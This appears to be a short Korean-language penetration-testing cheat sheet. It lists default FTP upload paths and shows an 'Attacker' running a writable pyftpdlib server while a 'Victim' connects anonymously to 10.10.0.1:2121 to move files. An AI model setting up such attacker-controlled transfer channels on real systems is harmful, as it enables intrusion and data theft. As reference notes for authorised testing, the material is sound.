### 기본값
익명 사용자 업로드: `/var/ftp/` 
사용자 업로드: `/home/<username>`

### ftp 로 파일 전송
```bash
# Attacker
python -m pyftpdlib -w
# Victim
ftp
open 10.10.0.1 2121
anonymous
```
